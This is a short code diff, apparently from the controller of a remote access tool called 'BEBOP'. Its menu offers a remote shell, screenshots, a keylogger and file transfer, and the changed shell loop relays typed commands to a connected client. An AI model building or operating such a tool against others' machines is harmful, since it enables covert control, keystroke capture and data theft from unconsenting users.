@@ -7,10 +7,9 @@ def print_menu():
     print("\n/-------BEBOP-------/\n")
     print("1.) Open shell")
     print("2.) Take screenshot")
-    print("3.) Begin screen stream")
-    print("4.) Keylogger")
-    print("5.) File upload/download")
-    print("6.) Exit\n\n")
+    print("3.) Keylogger")
+    print("4.) File upload/download")
+    print("5.) Exit\n\n")
 
 def establish_connection():
     global conn_to_client, server
@@ -47,14 +46,11 @@ def send(data):
 def open_shell():
     while True:
         cmd = input("bebop#: ")
-        if not cmd:
-            cmd = " "
-        elif cmd == "exit":
+        if cmd == "exit":
             send(cmd.encode())
             break
 
         send(cmd.encode())
-
         output = recv()
         print(output.decode())
 
